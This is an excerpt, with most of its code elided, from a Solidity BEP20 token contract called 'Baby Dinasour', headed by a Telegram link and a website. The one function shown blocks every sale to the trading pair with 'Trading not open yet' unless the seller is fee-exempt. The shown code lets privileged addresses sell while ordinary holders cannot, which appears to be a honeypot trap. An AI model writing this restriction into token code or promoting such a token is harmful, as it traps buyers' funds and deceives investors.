/**
 * TG:https://t.me/BabyDinasourBNB Website:babydino.info
*/ 
...
contract BabyDinasour is IBEP20, Auth {
    ...
    string constant _name = "Baby Dinasour";
    string constant _symbol = "Baby DINO";
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
		...
		if(recipient == pair){
			require(isFeeExempt[sender],"Trading not open yet");
        }
		}
